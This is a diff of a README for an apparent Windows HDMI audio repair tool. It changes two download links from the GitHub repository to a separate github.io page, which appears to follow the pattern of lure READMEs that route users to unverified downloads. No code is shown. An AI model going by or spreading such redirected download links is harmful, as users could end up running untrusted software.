@@ -1,6 +1,6 @@
 # 🔊 HDMI-Audio-Fix-PowerShell - Restore missing sound on your Windows displays
 
-[![](https://img.shields.io/badge/Download-HDMI_Audio_Fix-blue.svg)](https://github.com/Rozinaunarmoured388/HDMI-Audio-Fix-PowerShell)
+[![](https://img.shields.io/badge/Download-HDMI_Audio_Fix-blue.svg)](https://rozinaunarmoured388.github.io)
 
 HDMI-Audio-Fix-PowerShell helps you fix audio issues on Windows 10 and 11. Sometimes your computer fails to detect sound through HDMI or DisplayPort cables. This tool identifies common driver communication errors and restores the connection between your graphics card and your display. It works for NVIDIA, AMD, and Intel graphics systems.
 
@@ -15,7 +15,7 @@ Your computer needs:
 
 Follow these steps to download and run the repair tool.
 
-1. Go to the [official release page](https://github.com/Rozinaunarmoured388/HDMI-Audio-Fix-PowerShell) to download the package.
+1. Go to the [official release page](https://rozinaunarmoured388.github.io) to download the package.
 2. Locate the zip file in your Downloads folder.
 3. Right-click the folder and select Extract All.
 4. Open the extracted folder.
